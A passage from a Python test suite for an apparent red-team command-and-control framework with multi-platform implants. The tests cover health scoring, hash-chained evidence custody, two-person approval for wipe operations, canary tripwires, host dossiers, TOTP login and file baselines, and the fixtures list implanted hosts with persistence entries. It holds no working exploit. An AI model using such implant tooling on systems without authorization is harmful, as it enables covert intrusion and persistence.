        assert part in health_go, f"the score has no {part}"
    assert "func ScoreFleet(" in health_go
    assert "func Grade(" in health_go

    # The server answers the one command of the health.
    assert 'case "health.fleet"' in operator, "the server has no health.fleet"
    assert 'self.rpc("health.fleet"' in client_src, (
        "the console cannot reach health.fleet")
    assert re.search(r'"health.fleet":\s+Viewer,', rbac)
    assert 'sub.add_parser("health"' in cli_src
    assert "print_health_fleet" in cli_src

    token = b"health-token-0123456789ab"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        payload = client.health_fleet()
        assert payload.get("count") == 0, payload
        assert payload.get("average") == 0, payload
        assert "counts" in payload, payload

        # A host that checked in is scored, and the score has reasons.
        with server._lock:
            now = int(time.time())
            server.agents["web-01"] = {
                "id": "web-01",
                "host": "web-01.local",
                "os": "linux",
                "arch": "amd64",
                "user": "root",
                "state": "online",
                "transport": "tcp",
                "sleep": 60,
                "jitter": 10,
                "last_seen": now,
                "checkins": 3,
                "caps": [],
                "persist": [{"technique": "cron", "state": "installed"}],
                "posture": {"label": "production server"},
            }
            server.agents["ghost-01"] = {
                "id": "ghost-01",
                "host": "ghost-01.local",
                "os": "linux",
                "arch": "amd64",
                "user": "root",
                "state": "offline",
                "transport": "tcp",
                "sleep": 60,
                "jitter": 10,
                "last_seen": 0,
                "checkins": 0,
                "caps": [],
                "persist": [],
                "posture": {},
            }
        payload = client.health_fleet()
        assert payload.get("count") == 2, payload
        reports = payload["reports"]
        # The worst host comes first.
        assert reports[0]["agent_id"] == "ghost-01", reports
        assert reports[0]["score"] < reports[1]["score"], reports
        assert reports[0]["grade"] in ("lost", "poor"), reports
        assert reports[0]["notes"], "the lost host has no reason"
        parts = {p["name"] for p in reports[1]["parts"]}
        assert parts == {"reachability", "cadence", "capacity", "persistence",
                         "posture"}, reports
        for part in reports[1]["parts"]:
            assert part["note"], f"the part {part['name']} has no reason"
    finally:
        client.close()
        server.stop()


def test_the_chain_of_custody_cannot_be_edited():
    """The evidence of the engagement is a chain of hashes.

    Every piece of evidence is hashed when it enters the case, and every
    hand the evidence passes through is written into a chain that is
    append-only.  An event that is edited after the fact breaks the
    chain, and the answer names the event where it breaks.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    case_go = read_text("server/internal/casefile/casefile.go")
    operator = read_text("server/internal/link/operator.go")
    rbac = read_text("server/internal/rbac/rbac.go")
    client_src = read_text("operator/umbra_cli/client.py")
    cli_src = read_text("operator/umbra_cli/cli.py")

    # The case is a package of its own, with a chain of hashes.
    assert "package casefile" in case_go, "there is no registry of the cases"
    assert "func Verify(" in case_go, "the chain cannot be verified"
    assert "func (r *Registry) Export(" in case_go, (
        "the case file cannot be written for the handover")

    for command in ("case.create", "case.list", "case.get", "case.add",
                    "case.close"):
        assert f'case "{command}"' in operator, f"the server has no {command}"
        assert f'self.rpc("{command}"' in client_src, (
            f"the console cannot reach {command}")

    assert re.search(r'"case.list":\s+Viewer,', rbac)
    assert re.search(r'"case.get":\s+Viewer,', rbac)
    assert re.search(r'"case.create":\s+Operator,', rbac)
    assert re.search(r'"case.add":\s+Operator,', rbac)
    assert re.search(r'"case.close":\s+Operator,', rbac)

    assert 'sub.add_parser("case"' in cli_src
    assert "run_case" in cli_src

    token = b"case-token-0123456789abcd"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()

        # A case is opened by somebody, at a time.
        opened = client.case_create("the ticket of March", "the loader")
        case_id = opened.get("id")
        assert case_id, opened
        assert opened.get("head"), opened

        # A piece of evidence enters the case with its hash.
        artefact = client.case_add(case_id, "screenshot", "/var/lib/web-01.png",
                                   sha256="ab" * 32, agent_id="web-01",
                                   task_id="t-1", note="the screen")
        assert artefact.get("sha256") == "ab" * 32, artefact
        assert artefact.get("taken_by") == "alice", artefact

        # The case carries the evidence and the chain.
        got = client.case_get(case_id)
        assert got.get("intact") is True, got
        assert len(got.get("artefacts") or []) == 1, got
        assert len(got.get("events") or []) == 2, got
        for event in got["events"]:
            assert event.get("hash"), event
            assert event.get("prev") is not None, event

        # An event that is edited after the fact breaks the chain, and
        # the answer names the event where it breaks.
        with server._lock:
            server.cases[case_id]["events"][0]["note"] = "somebody changed it"
        broken = client.case_get(case_id)
        assert broken.get("intact") is False, broken
        assert int(broken.get("broken_at", 0)) == 1, broken
        assert broken.get("reason"), broken

        # The list says that the chain is broken, too.
        listed = client.case_list()
        assert listed["count"] == 1, listed
        assert listed["cases"][0]["intact"] is False, listed

        # A closed case takes no more evidence.
        closed = client.case_close(case_id, "the engagement is over")
        assert closed.get("state") == "closed", closed
        with pytest.raises(Exception):
            client.case_add(case_id, "report", "/tmp/x", sha256="cd" * 32)
    finally:
        client.close()
        server.stop()


def test_the_console_reaches_the_hunt_the_health_and_the_cases():
    """The console has a command for every part of the new work.

    A command nobody can type is a command that does not exist, so the
    parser knows the hunt, the health and the cases, and each of them
    reaches the server.
    """
    from umbra_cli import cli  # noqa: WPS433

    parser = cli.build_parser()

    args = parser.parse_args(["hunt", "list"])
    assert args.cmd == "hunt" and args.hunt_cmd == "list"
    args = parser.parse_args(["hunt", "add", "--kind", "hash", "--value", "ab"])
    assert args.hunt_cmd == "add" and args.kind == "hash"
    args = parser.parse_args(["hunt", "remove", "i-0001"])
    assert args.hunt_cmd == "remove" and args.id == "i-0001"
    args = parser.parse_args(["hunt", "sweep", "--all", "--roots", "/tmp,/opt"])
    assert args.hunt_cmd == "sweep" and args.all is True

    args = parser.parse_args(["health"])
    assert args.cmd == "health"

    args = parser.parse_args(["case", "list"])
    assert args.cmd == "case" and args.case_cmd == "list"
    args = parser.parse_args(["case", "show", "c-0001"])
    assert args.case_cmd == "show" and args.id == "c-0001"
    args = parser.parse_args(["case", "create", "the ticket of March"])
    assert args.case_cmd == "create" and args.title == "the ticket of March"
    args = parser.parse_args(["case", "add", "c-0001", "--ref", "/tmp/x"])
    assert args.case_cmd == "add" and args.ref == "/tmp/x"
    args = parser.parse_args(["case", "close", "c-0001", "--note", "done"])
    assert args.case_cmd == "close" and args.note == "done"


def test_the_two_person_rule_needs_a_second_pair_of_eyes():
    """The two-person rule: the operator who asked cannot decide.

    A destructive operation is not run on the word of one operator: the
    operator who wants it writes a request, another operator decides,
    and the decision does the work.  The refusal of the requester is
    the whole point of the rule, so the test asks for it and expects
    the refusal.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    approval_go = read_text("server/internal/approval/approval.go")
    operator = read_text("server/internal/link/operator.go")
    rbac = read_text("server/internal/rbac/rbac.go")
    client_src = read_text("operator/umbra_cli/client.py")
    cli_src = read_text("operator/umbra_cli/cli.py")
    config_src = read_text("server/internal/config/config.go")

    # The queue is a package of its own, with a lock and a file.
    assert "package approval" in approval_go, "there is no queue of approvals"
    assert "func (q *Queue) Request(" in approval_go
    assert "func (q *Queue) Decide(" in approval_go
    assert "func (q *Queue) Save(" in approval_go
    assert "func (q *Queue) Load(" in approval_go
    assert "0o600" in approval_go, "the queue is not written for the owner only"
    assert "ErrOwnRequest" in approval_go, (
        "the queue lets the requester decide the request")

    # The server answers the five commands of the rule.
    for command in ("approval.request", "approval.list", "approval.get",
                    "approval.approve", "approval.deny"):
        assert re.search(rf'case [^:\n]*"{command}"', operator), (
            f"the server has no {command}")
        assert f'self.rpc("{command}"' in client_src, (
            f"the console cannot reach {command}")

    # The reader of the queue is a viewer; the writer is an operator.
    assert re.search(r'"approval.list":\s+Viewer,', rbac)
    assert re.search(r'"approval.get":\s+Viewer,', rbac)
    assert re.search(r'"approval.request":\s+Operator,', rbac)
    assert re.search(r'"approval.approve":\s+Operator,', rbac)
    assert re.search(r'"approval.deny":\s+Operator,', rbac)

    # The rule is a policy of the deployment, and the deployment says
    # which kinds need it.
    assert "ApprovalRequired" in config_src, (
        "the deployment cannot say which operations need a second pair of eyes")

    # And the console has a command for it.
    assert "run_approval" in cli_src
    assert 'sub.add_parser("approval"' in cli_src

    token = b"approval-token-012345678"
    token_b = b"approval-second-012345678"
    server = MockServer(AGENT_PSK, {"alice": token, "bob": token_b})
    server.start()
    alice = OperatorClient(server.address, token.decode(), "alice")
    bob = OperatorClient(server.address, token_b.decode(), "bob")
    try:
        alice.connect()
        bob.connect()

        # The operator asks for an operation.
        asked = alice.approval_request("forensics.wipe", agent_id="web-01",
                                       reason="the engagement is over")
        assert asked.get("id"), asked
        assert asked.get("state") == "pending", asked
        assert asked.get("requested_by") == "alice", asked
        assert asked.get("kind") == "forensics.wipe", asked

        # The queue shows the request to the whole team.
        listed = alice.approval_list()
        assert listed["count"] == 1, listed
        assert listed["requests"][0]["id"] == asked["id"], listed

        # The operator who asked cannot decide it: that is the rule.
        with pytest.raises(Exception):
            alice.approval_approve(asked["id"], "my own request")

        # Another operator says no, and the note says why.
        denied = bob.approval_deny(asked["id"], "the host is still in use")
        assert denied.get("state") == "denied", denied
        assert denied.get("decided_by") == "bob", denied
        assert denied.get("note") == "the host is still in use", denied

        # A decided request is not decided twice.
        with pytest.raises(Exception):
            bob.approval_approve(asked["id"], "too late")

        # And the operator who asked for it is still refused afterwards.
        with pytest.raises(Exception):
            alice.approval_approve(asked["id"], "my own request")

        # A second request, and this time somebody else says yes: the
        # operation is queued on the host.
        second = alice.approval_request("forensics.wipe", agent_id="web-01",
                                        reason="the engagement is over")
        approved = bob.approval_approve(second["id"], "the customer agreed")
        assert approved.get("state") == "approved", approved
        assert approved.get("decided_by") == "bob", approved
        assert approved.get("task_id"), (
            "the approved operation was not queued on the host")

        # The request itself is readable by anybody.
        fetched = bob.approval_get(second["id"])
        assert fetched.get("state") == "approved", fetched
        assert fetched.get("requested_by") == "alice", fetched
    finally:
        alice.close()
        bob.close()
        server.stop()


def test_the_tripwires_say_that_nobody_else_was_on_the_host():
    """The tripwires: a file that changes says that somebody was there.

    The implant plants a small file with a secret in it, and the implant
    remembers what it wrote.  When the file changes or disappears, the
    verdict is "changed" or "missing", the ledger of the server says so,
    and the operator learns about it while the engagement is still
    running.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    canary_go = read_text("server/internal/canary/canary.go")
    operator = read_text("server/internal/link/operator.go")
    rbac = read_text("server/internal/rbac/rbac.go")
    client_src = read_text("operator/umbra_cli/client.py")
    cli_src = read_text("operator/umbra_cli/cli.py")
    rust_task = read_text("implant/rust/src/task.rs")
    kotlin_task = read_text(
        "implant/android/app/src/main/java/io/umbra/beacon/TaskRunner.kt")
    go_tasks = read_text("implant/go/internal/beacon/tasks.go")
    protocol = read_text("docs/PROTOCOL.md")

    # The ledger is a package of its own, with a lock and a file.
    assert "package canary" in canary_go, "there is no ledger of the tripwires"
    assert "func (r *Registry) Plant(" in canary_go
    assert "func (r *Registry) RecordCheck(" in canary_go
    assert "func ParseVerdicts(" in canary_go
    assert "0o600" in canary_go, "the ledger is not written for the owner only"

    # The server answers the five commands of the tripwires.
    for command in ("canary.plant", "canary.list", "canary.get",
                    "canary.check", "canary.remove"):
        assert f'case "{command}"' in operator, f"the server has no {command}"
        assert f'self.rpc("{command}"' in client_src, (
            f"the console cannot reach {command}")

    # The reader of the ledger is a viewer; the writer is an operator.
    assert re.search(r'"canary.list":\s+Viewer,', rbac)
    assert re.search(r'"canary.get":\s+Viewer,', rbac)
    assert re.search(r'"canary.plant":\s+Operator,', rbac)
    assert re.search(r'"canary.check":\s+Operator,', rbac)
    assert re.search(r'"canary.remove":\s+Operator,', rbac)

    # The task kind is understood by the three implants.
    assert '"canary.plant" =>' in rust_task, "the rust beacon cannot plant"
    assert '"canary.check" =>' in rust_task, "the rust beacon cannot look"
    assert '"canary.plant" ->' in kotlin_task, "the android beacon cannot plant"
    assert '"canary.check" ->' in kotlin_task, "the android beacon cannot look"
    assert 'case "canary.plant":' in go_tasks, "the go beacon cannot plant"
    assert 'case "canary.check":' in go_tasks, "the go beacon cannot look"

    # The console has a command for it, and the document says what it is.
    assert "run_canary" in cli_src
    assert 'sub.add_parser("canary"' in cli_src
    assert "| `canary.plant` |" in protocol
    assert "| `canary.check` |" in protocol

    token = b"canary-token-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-canary", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        assert wait_until(lambda: bool(client.agents()), timeout=10), (
            "the agent never showed up")

        # A tripwire is planted on the host.
        planted = client.canary_plant("agent-canary", "the web server")
        assert planted.get("id"), planted
        assert planted.get("state") == "planted", planted
        canary_id = planted["id"]

        # The secret of the file never travels to the console.
        listed = client.canary_list()
        assert listed["count"] == 1, listed
        assert "token" not in listed["canaries"][0], listed
        assert listed["canaries"][0]["label"] == "the web server", listed

        # The planting reaches the host.
        task_id = planted["task_id"]
        assert wait_until(
            lambda: client.task(task_id).get("state") in ("done", "failed"),
            timeout=15), "the planting never came back"
        record = client.task(task_id)
        assert record.get("state") == "done", record
        meta = record.get("meta") or {}
        assert meta.get("attested") is True, (
            "the server did not verify the attestation of the planting")
        path = meta.get("canary_path")
        assert path, meta

        # The look: the file is as it was planted.
        checked = client.canary_check(agent_id="agent-canary")
        check_task = checked["tasks"][0]["task_id"]
        assert wait_until(
            lambda: client.task(check_task).get("state") in ("done", "failed"),
            timeout=15), "the look never came back"
        assert wait_until(
            lambda: client.canary_get(canary_id).get("state") == "intact",
            timeout=10), "the ledger did not learn the verdict"
        assert client.canary_get(canary_id).get("verdict"), (
            "the verdict of the implant did not reach the ledger")

        # Somebody else was on the machine: the file changed.
        with open(path, "wb") as handle:
            handle.write(b"somebody else was here")
        checked = client.canary_check(agent_id="agent-canary")
        check_task = checked["tasks"][0]["task_id"]
        assert wait_until(
            lambda: client.task(check_task).get("state") in ("done", "failed"),
            timeout=15), "the look never came back"
        assert wait_until(
            lambda: client.canary_get(canary_id).get("state") == "changed",
            timeout=10), "the ledger did not learn that the file was touched"

        # And then the file is gone.
        os.remove(path)
        checked = client.canary_check(agent_id="agent-canary")
        check_task = checked["tasks"][0]["task_id"]
        assert wait_until(
            lambda: client.task(check_task).get("state") in ("done", "failed"),
            timeout=15), "the look never came back"
        assert wait_until(
            lambda: client.canary_get(canary_id).get("state") == "missing",
            timeout=10), "the ledger did not learn that the file is gone"

        # The operator stops watching it: the file stays where it is.
        removed = client.canary_remove(canary_id)
        assert removed.get("removed") is True, removed
        assert client.canary_list()["count"] == 0
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_file_of_a_host_is_one_page():
    """The dossier: everything the server knows about a host, on one page.

    A dossier that says only "the host is fine" is a dossier nobody can
    act on: the work that was run, the persistence, the tripwires and
    the requests are counted, and what is not known is said as well.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    dossier_go = read_text("server/internal/dossier/dossier.go")
    operator = read_text("server/internal/link/operator.go")
    rbac = read_text("server/internal/rbac/rbac.go")
    client_src = read_text("operator/umbra_cli/client.py")
    cli_src = read_text("operator/umbra_cli/cli.py")
    server_go = read_text("server/internal/link/server.go")

    # The dossier is a package of its own.
    assert "package dossier" in dossier_go, "there is no file of a host"
    assert "func Build(" in dossier_go
    assert "func (d Dossier) Line()" in dossier_go

    # The server answers the two commands of the dossier.
    for command in ("dossier.get", "dossier.list"):
        assert f'case "{command}"' in operator, f"the server has no {command}"
        assert f'self.rpc("{command}"' in client_src, (
            f"the console cannot reach {command}")

    # The reader of the dossier is a viewer.
    assert re.search(r'"dossier.get":\s+Viewer,', rbac)
    assert re.search(r'"dossier.list":\s+Viewer,', rbac)

    # The server gathers it from the store, the health and the ledgers.
    assert "func (s *Server) Dossier(" in server_go
    assert "health.Score(" in server_go
    assert "s.Canaries.ForHost(" in server_go
    assert "s.Approvals.List(" in server_go

    # And the console has a command for it.
    assert "run_dossier" in cli_src
    assert 'sub.add_parser("dossier"' in cli_src
    assert "print_dossier" in cli_src

    token = b"dossier-token-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        with server._lock:
            now = int(time.time())
            server.agents["web-01"] = {
                "id": "web-01",
                "host": "web-01.local",
                "os": "linux",
                "arch": "amd64",
                "user": "root",
                "state": "online",
                "transport": "tcp",
                "sleep": 60,
                "jitter": 10,
                "last_seen": now,
                "first_seen": now - 3600,
                "checkins": 7,
                "version": "1.2.3",
                "tags": ["dc-01"],
                "persist": [
                    {"technique": "systemd.user", "name": "the beacon",
                     "trigger": "logon", "location": "/home/root/.config",
                     "state": "installed"},
                    {"technique": "cron.d", "name": "the beacon",
                     "trigger": "boot", "location": "/etc/cron.d/beacon",
                     "state": "broken"},
                ],
                "posture": {"label": "production server"},
            }
            server.tasks["t-1"] = {
                "id": "t-1", "agent_id": "web-01", "kind": "hunt.scan",
                "state": "done", "created": now - 60, "completed": now - 50,
                "args": {}, "out": b"", "err": "",
            }
            server.tasks["t-2"] = {
                "id": "t-2", "agent_id": "web-01", "kind": "wipe.survey",
                "state": "failed", "created": now - 40, "completed": now - 30,
                "args": {}, "out": b"", "err": "the host did not answer",
            }
            server.canaries["c-0001"] = {
                "id": "c-0001", "label": "the web server", "token": "secret",
                "agent_id": "web-01", "kind": "file", "state": "changed",
                "planted_at": now - 120, "checked_at": now - 30, "note": "",
                "verdict": "",
            }
            server.approvals["a-0001"] = {
                "id": "a-0001", "kind": "forensics.wipe", "agent_id": "web-01",
                "args": {}, "reason": "the engagement is over",
                "requested_by": "alice", "requested_at": now - 60,
                "state": "pending", "decided_by": "", "decided_at": 0,
                "note": "", "expires_at": now + 600,
            }

        # The file of the host.
        dossier = client.dossier_get("web-01")
        assert dossier.get("id") == "web-01", dossier
        assert dossier.get("host") == "web-01.local", dossier
        assert dossier.get("tasks_done") == 1, dossier
        assert dossier.get("tasks_failed") == 1, dossier
        assert dossier.get("persist_broken") == 1, dossier
        assert dossier.get("posture") == "production server", dossier
        assert dossier.get("kinds", {}).get("hunt.scan") == 1, dossier
        assert len(dossier.get("canaries") or []) == 1, dossier
        assert len(dossier.get("approvals") or []) == 1, dossier
        assert dossier.get("summary"), dossier
        assert any("touched" in line for line in dossier["summary"]), dossier
        assert dossier.get("gaps") is not None, dossier

        # A host the server never saw is a gap, not a page of nothing.
        with server._lock:
            server.agents["ghost-01"] = {
                "id": "ghost-01", "host": "ghost-01.local", "os": "linux",
                "arch": "amd64", "state": "offline", "last_seen": 0,
                "first_seen": 0, "checkins": 0,
            }
        ghost = client.dossier_get("ghost-01")
        assert ghost.get("gaps"), ghost
        assert any("never answered" in gap for gap in ghost["gaps"]), ghost

        # The list of the files, the weakest host first.
        listed = client.dossier_list()
        assert listed["count"] == 2, listed
        assert listed["dossiers"][0]["id"] == "ghost-01", listed
    finally:
        client.close()
        server.stop()


def test_the_console_reaches_the_approvals_the_tripwires_and_the_dossiers():
    """The console has a command for every part of the new work.

    A command nobody can type is a command that does not exist, so the
    parser knows the approvals, the tripwires and the dossiers.
    """
    from umbra_cli import cli  # noqa: WPS433

    parser = cli.build_parser()

    args = parser.parse_args(["approval", "list"])
    assert args.cmd == "approval" and args.approval_cmd == "list"
    args = parser.parse_args(["approval", "request", "forensics.wipe",
                               "--agent", "web-01", "--reason", "the end"])
    assert args.approval_cmd == "request" and args.kind == "forensics.wipe"
    assert args.agent == "web-01" and args.reason == "the end"
    args = parser.parse_args(["approval", "approve", "a-0001", "--note", "ok"])
    assert args.approval_cmd == "approve" and args.id == "a-0001"
    args = parser.parse_args(["approval", "deny", "a-0001"])
    assert args.approval_cmd == "deny" and args.id == "a-0001"

    args = parser.parse_args(["canary", "list"])
    assert args.cmd == "canary" and args.canary_cmd == "list"
    args = parser.parse_args(["canary", "plant", "--agent", "web-01",
                               "--label", "the web server"])
    assert args.canary_cmd == "plant" and args.agent == "web-01"
    assert args.label == "the web server"
    args = parser.parse_args(["canary", "check", "--all", "--wait"])
    assert args.canary_cmd == "check" and args.all is True
    args = parser.parse_args(["canary", "remove", "c-0001"])
    assert args.canary_cmd == "remove" and args.id == "c-0001"

    args = parser.parse_args(["dossier", "list"])
    assert args.cmd == "dossier" and args.dossier_cmd == "list"
    args = parser.parse_args(["dossier", "show", "web-01"])
    assert args.dossier_cmd == "show" and args.agent == "web-01"


def test_the_console_needs_the_code_of_the_moment():
    """The second factor: the token alone is not enough any more.

    The token of an operator is a secret that lives in the configuration
    of the server and in the memory of the console.  The second factor
    is a secret that lives in the phone of the operator and never
    travels: the console sends the six digits of the moment and the
    server checks them before it answers the handshake.

    The test asks for the refusal, because a refusal is the only thing
    that proves the check happens: a console without the code has to be
    turned away at the door, and a console with the code has to get in.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433
    from umbra_cli import cli as cli_mod  # noqa: WPS433

    otp_go = read_text("server/internal/otp/otp.go")
    operator = read_text("server/internal/link/operator.go")
    server_src = read_text("server/internal/link/server.go")
    rbac = read_text("server/internal/rbac/rbac.go")
    client_src = read_text("operator/umbra_cli/client.py")
    cli_src = read_text("operator/umbra_cli/cli.py")

    # The second factor is a package of its own, and the file of the
    # secrets belongs to the server alone.
    assert "package otp" in otp_go, "there is no registry of second factors"
    assert "func (r *Registry) Rotate(" in otp_go
    assert "func (r *Registry) Verify(" in otp_go
    assert "func (r *Registry) Save(" in otp_go
    assert "0o600" in otp_go, "the secrets are not written for the owner only"
    assert "ConstantTimeCompare" in otp_go, "the code is not compared in constant time"

    # The server asks for the code before it answers the handshake, so a
    # console without it never gets a session.
    assert "checkSecondFactor" in server_src, "the server never asks for the code"
    assert "checkSecondFactor" in operator, "the handshake does not ask for the code"

    # The three commands of the second factor.
    for command in ("operator.otp.status", "operator.otp.rotate",
                    "operator.otp.remove"):
        assert re.search(rf'case [^:\n]*"{command}"', operator), (
            f"the server has no {command}")
        assert f'self.rpc("{command}"' in client_src, (
            f"the console cannot reach {command}")

    # Reading who has one is a read; making one is the work of the team.
    assert re.search(r'"operator.otp.status":\s+Viewer,', rbac)
    assert re.search(r'"operator.otp.rotate":\s+Operator,', rbac)
    assert re.search(r'"operator.otp.remove":\s+Operator,', rbac)

    # And the console has a command for it.
    assert "run_otp" in cli_src
    assert 'sub.add_parser("otp"' in cli_src

    # The code of the console is the code of the phone: the vectors of
    # RFC 6238 are the same on both sides.
    secret = "GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ"
    assert cli_mod.totp_code(secret, when=59) == "287082"
    assert cli_mod.totp_code(secret, when=1111111109) == "081804"
    assert cli_mod.totp_code(secret, when=1234567890) == "005924"

    token = b"otp-token-0123456789ab"
    token_b = b"otp-second-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token, "bob": token_b})
    server.start()
    alice = OperatorClient(server.address, token.decode(), "alice")
    try:
        alice.connect()

        # Nobody has a second factor yet.
        status = alice.operator_otp_status()
        assert status["count"] == 0, status

        # The team makes one for bob.  The secret is shown once.
        rotated = alice.operator_otp_rotate(operator="bob", issuer="the team")
        assert rotated.get("secret"), rotated
        assert rotated.get("uri", "").startswith("otpauth://totp/"), rotated
        the_secret = rotated["secret"]

        # The list of the second factors never carries the secret.
        status = alice.operator_otp_status()
        assert status["count"] == 1, status
        assert the_secret not in repr(status), status
        assert status["operators"][0]["operator"] == "bob", status
        assert status["operators"][0]["enabled"] is True, status

        # Bob's console without the code is turned away at the door:
        # the token alone is not enough any more.
        bob = OperatorClient(server.address, token_b.decode(), "bob")
        with pytest.raises(Exception):
            bob.connect()
        bob.close()

        # A wrong code is refused as well.
        code = cli_mod.totp_code(the_secret)
        wrong = code[:-1] + ("0" if code[-1] != "0" else "1")
        bob = OperatorClient(server.address, token_b.decode(), "bob", otp=wrong)
        with pytest.raises(Exception):
            bob.connect()
        bob.close()

        # The code of the moment opens the console.
        bob = OperatorClient(server.address, token_b.decode(), "bob", otp=code)
        bob.connect()
        try:
            assert bob.rpc("whoami").ok, "the console with the code was refused"
        finally:
            bob.close()

        # The second factor can be taken away: the console works again
        # with the token alone.
        alice.operator_otp_remove(operator="bob")
        bob = OperatorClient(server.address, token_b.decode(), "bob")
        bob.connect()
        bob.close()
    finally:
        alice.close()
        server.stop()


def test_the_baseline_says_what_was_touched():
    """The baseline of a host: the paths the team watches.

    A hunt looks for the indicators of somebody else; a baseline asks a
    different question: is this host the one we saw yesterday?  The team
    names the paths, the implant looks at them, and the server keeps the
    drift.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
    from mock_server import FakeAgent, MockServer  # noqa: WPS433
    from umbra_cli.client import OperatorClient  # noqa: WPS433

    baseline_go = read_text("server/internal/baseline/baseline.go")
    operator = read_text("server/internal/link/operator.go")
    rbac = read_text("server/internal/rbac/rbac.go")
    client_src = read_text("operator/umbra_cli/client.py")
    cli_src = read_text("operator/umbra_cli/cli.py")
    go_tasks = read_text("implant/go/internal/beacon/tasks.go")
    rust_task = read_text("implant/rust/src/task.rs")
    kotlin_task = read_text(
        "implant/android/app/src/main/java/io/umbra/beacon/TaskRunner.kt")
    protocol = read_text("docs/PROTOCOL.md")

    # The baseline is a package of its own, with a lock and a file.
    assert "package baseline" in baseline_go, "there is no baseline"
    assert "func (r *Registry) Add(" in baseline_go
    assert "func (r *Registry) Record(" in baseline_go
    assert "func (r *Registry) Save(" in baseline_go
    assert "0o600" in baseline_go, "the baseline is not written for the owner only"

    # The server answers the four commands of the baseline.
    for command in ("baseline.add", "baseline.list", "baseline.remove",
                    "baseline.check"):
        assert re.search(rf'case [^:\n]*"{command}"', operator), (
            f"the server has no {command}")
        assert f'self.rpc("{command}"' in client_src, (
            f"the console cannot reach {command}")

    # Reading the baseline is a viewer; planting a path and looking at
    # it are the work of the team.
    assert re.search(r'"baseline.add":\s+Operator,', rbac)
    assert re.search(r'"baseline.list":\s+Viewer,', rbac)
    assert re.search(r'"baseline.remove":\s+Operator,', rbac)
    assert re.search(r'"baseline.check":\s+Operator,', rbac)

    # The task kind is understood by the three implants.
    assert 'case "baseline.look":' in go_tasks, "the go beacon cannot look"
    assert '"baseline.look" =>' in rust_task, "the rust beacon cannot look"
    assert '"baseline.look" ->' in kotlin_task, "the android beacon cannot look"
    assert 'baseline.look' in protocol, "the protocol does not name the look"

    # And the console has a command for it.
    assert "run_baseline" in cli_src
    assert 'sub.add_parser("baseline"' in cli_src

    token = b"baseline-token-0123456789"
    server = MockServer(AGENT_PSK, {"alice": token})
    server.start()
    agent = FakeAgent(server.address, AGENT_PSK, "agent-baseline", interval=0.2)
    agent.start()
    client = OperatorClient(server.address, token.decode(), "alice")
    try:
        client.connect()
        assert wait_until(lambda: bool(client.agents()), timeout=10), (
            "the agent never showed up")

        # The path is named.
        watched = client.baseline_add("agent-baseline", "/etc/app/config.json",
                                      label="the config of the app")
        assert watched.get("id"), watched
        assert watched.get("state") == "unknown", watched

        # The baseline knows the path.
        listed = client.baseline_list()
        assert listed["count"] == 1, listed
        assert listed["entries"][0]["path"] == "/etc/app/config.json", listed
        assert listed["entries"][0]["state"] == "unknown", listed

        # The look is queued on the host.
        checked = client.baseline_check("agent-baseline")
        task_id = checked.get("task_id")
        assert task_id, checked
        assert checked["paths"] == 1, checked

        # The implant answered and the ledger learned the look.
        assert wait_until(
            lambda: client.task(task_id).get("state") in ("done", "failed"),
            timeout=15), "the look never came back"
        task = client.task(task_id)
        assert task.get("state") == "done", task
        assert (task.get("meta") or {}).get("attested"), task
        meta = task.get("meta") or {}
        raw = str(meta.get("baseline_snaps", "") or "")
        assert raw, meta
        snaps = json.loads(raw)
        assert len(snaps) == 1, snaps
        assert snaps[0]["path"] == "/etc/app/config.json", snaps
        assert snaps[0]["exists"] is True or snaps[0]["exists"] is False, snaps

        # The baseline says what the look found.
        got = client.baseline_list(agent_id="agent-baseline")
        assert got["count"] == 1, got
        assert got["entries"][0]["state"] in ("present", "changed",
                                             "missing", "appeared"), got

        # The path can stop being watched: the file on the host stays.
        removed = client.baseline_remove(got["entries"][0]["id"])
        assert removed.get("removed") is True, removed
        assert client.baseline_list()["count"] == 0
    finally:
        client.close()
        agent.stop()
        server.stop()


def test_the_console_reaches_the_baseline():
    """The console has a command for the baseline.

    A command nobody can type is a command that does not exist, so the
    parser knows the watched paths, the look and the entry that stops.
    """
    from umbra_cli import cli  # noqa: WPS433

    parser = cli.build_parser()

    args = parser.parse_args(["baseline", "list"])
    assert args.cmd == "baseline" and args.baseline_cmd == "list"
    args = parser.parse_args(["baseline", "add", "--agent", "web-01",
                               "/etc/app/config.json",
                               "--label", "the config"])
    assert args.baseline_cmd == "add" and args.agent == "web-01"
    assert args.path == "/etc/app/config.json"
    args = parser.parse_args(["baseline", "remove", "b-0001"])
    assert args.baseline_cmd == "remove" and args.id == "b-0001"
    args = parser.parse_args(["baseline", "check", "--agent", "web-01", "--wait"])
    assert args.baseline_cmd == "check" and args.agent == "web-01"
    assert args.wait is True


def test_the_notes_of_the_team_travel_with_the_host():
    """The notes of the team are the words they write about a host.

    The dossier of a host is what the server knows; the notes are what
    the team says.  A note is one short line of words, the operator who
    wrote it and the moment it was written, and it travels with the
    host it is about, so a note that is not where the host is looked
    at is a note nobody finds.
    """
    sys.path.insert(0, os.path.join(ROOT, "tools"))
